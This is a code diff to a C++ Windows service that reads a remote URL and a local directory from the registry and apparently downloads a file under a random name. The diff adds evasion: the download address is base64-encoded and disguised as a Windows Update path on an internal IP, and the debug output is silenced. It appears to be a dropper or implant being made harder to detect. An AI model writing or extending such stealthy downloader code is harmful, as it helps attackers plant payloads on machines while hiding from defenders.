@@ -4,18 +4,24 @@
 #include <iostream>
 #include <windows.h>
 #include <vector>
+#include "decoder.h"
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hStatusHandle;
 
 std::wstring remoteUrl;
+std::vector<std::wstring> remoteUrls;
 std::wstring localDir;
 std::wstring fullUrl;
 
-std::vector<std::wstring> remoteUrls = {
-    /*L"http://192.168.7.20:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
-    L"http://192.168.7.16:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",*/
-    L"http://192.168.145.158:8080/client"
+//std::vector<std::wstring> remoteUrls = {
+//    L"http://10.64.182.14:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+//    L"http://10.64.97.233:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client",
+//    L"http://10.64.141.76:8080/windowsupdate/v10/handlers/secure/enroll/mssecure/download/client"
+//};
+
+std::vector<std::string> encodedURLs = {
+       "aHR0cDovLzE5Mi4xNjguMTQ1LjE1ODo4MDgwL3dpbmRvd3N1cGRhdGUvdjEwL2hhbmRsZXJzL3NlY3VyZS9lbnJvbGwvbXNzZWN1cmUvZG93bmxvYWQvY2xpZW50"
 };
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode)
@@ -51,22 +57,25 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
         dwSize = sizeof(szRemoteUrl);
         if (RegQueryValueEx(hKey, L"RemoteUrl", NULL, NULL, (LPBYTE)szRemoteUrl, &dwSize) == ERROR_SUCCESS) {
             remoteUrl = szRemoteUrl;  // Directly assign to remoteUrl
-            wprintf(L"Remote URL: %ls\n", remoteUrl.c_str());
+            //wprintf(L"Remote URL: %ls\n", remoteUrl.c_str());
         }
 
         // Get local directory
         dwSize = sizeof(szLocalDir);
         if (RegQueryValueEx(hKey, L"LocalDir", NULL, NULL, (LPBYTE)szLocalDir, &dwSize) == ERROR_SUCCESS) {
             localDir = szLocalDir;  // Directly assign to localDir
-            wprintf(L"Local Directory: %ls\n", localDir.c_str());
+            //wprintf(L"Local Directory: %ls\n", localDir.c_str());
         }
 
         RegCloseKey(hKey);
     }
 
+    // Decode urls
+    auto remoteUrls = DecodeBase64List(encodedURLs);
+
     // Check if the parameters were successfully retrieved
     if (remoteUrl.empty() || localDir.empty()) {
-        wprintf(L"Error: Missing parameters from registry.\n");
+        //wprintf(L"Error: Missing parameters from registry.\n");
         return;
     }
 
@@ -77,8 +86,8 @@ void WINAPI ServiceMain(DWORD argc, LPSTR* argv) {
 
     std::wstring localFile = localDir + GenerateRandomFilename();  // Append random filename to the directory path
 
-    wprintf(L"Using URL: %ls\n", remoteUrl.c_str());
-    wprintf(L"Generated local file: %ls\n", localFile.c_str());
+    //wprintf(L"Using URL: %ls\n", remoteUrl.c_str());
+    //wprintf(L"Generated local file: %ls\n", localFile.c_str());
 
     // Initialize random generator
     std::random_device rd;
